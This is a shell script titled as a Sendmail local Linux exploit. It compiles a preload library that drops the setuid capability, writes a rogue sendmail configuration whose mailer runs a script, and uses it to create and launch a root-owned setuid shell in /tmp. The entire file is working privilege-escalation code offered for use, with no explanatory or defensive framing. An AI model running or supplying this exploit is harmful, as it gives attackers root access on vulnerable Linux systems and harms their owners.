#!/bin/sh
echo " Sendmail local linux exploit "
TMPDIR=/tmp/foo
SUIDSHELL=/tmp/sh
SHELL=/bin/tcsh
umask 022
echo "Creating temporary directory"
mkdir -p $TMPDIR
cd $TMPDIR
echo "Creating anti-noexec library (capdrop.c)"
cat <<_FOE_ > capdrop.c
#define __KERNEL__
#include <linux/capability.h>
#undef __KERNEL__
#include <linux/unistd.h>
_syscall2(int, capset, cap_user_header_t, header, const cap_user_data_t, data)
extern int capset(cap_user_header_t header, cap_user_data_t data);
void unsetenv(const char*);
void _init(void) {
	struct __user_cap_header_struct caph={_LINUX_CAPABILITY_VERSION, 0};
	struct __user_cap_data_struct capd={0, 0, 0xfffffe7f};
	unsetenv("LD_PRELOAD");
	capset(&caph, &capd); 
	system("echo|/usr/sbin/sendmail -C$TMPDIR/sm.cf $USER");
}
_FOE_
echo "Compiling anti-noexec library (capdrop.so)"
cc capdrop.c -c -o capdrop.o
ld -shared capdrop.o -o capdrop.so
echo "Creating suid shell (sush.c)"
cat <<_FOE_ > sush.c
#include <unistd.h>
int main() { setuid(0); setgid(0); execl("/bin/sh", "sh", NULL); }
_FOE_
echo "Compiling suid shell (sush.c)"
cc sush.c -o $TMPDIR/sush
echo "Creating shell script"
cat <<_FOE_ >script
mv $TMPDIR/sush $SUIDSHELL
chown root.root $SUIDSHELL
chmod 4111 $SUIDSHELL
exit 0
_FOE_
echo "Creating own sm.cf"
cat <<_FOE_ >$TMPDIR/sm.cf
O QueueDirectory=$TMPDIR
O ForwardPath=/no_forward_file
S0
R\$*	\$#local \$: \$1
Mlocal,	P=$SHELL, F=lsDFMAw5:/|@qSPfhn9, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,
	T=DNS/RFC822/X-Unix, A=$SHELL $TMPDIR/script
_FOE_
echo "Dropping CAP_SETUID and calling sendmail"
export LD_PRELOAD=$TMPDIR/capdrop.so
/bin/true
unset LD_PRELOAD
echo "Waiting for suid shell ($SUIDSHELL)"
while [ ! -f $SUIDSHELL ]; do sleep 1; done
echo "Removing everything"
cd ..
rm -fr $TMPDIR
echo "Suid shell at $SUIDSHELL"
$SUIDSHELL
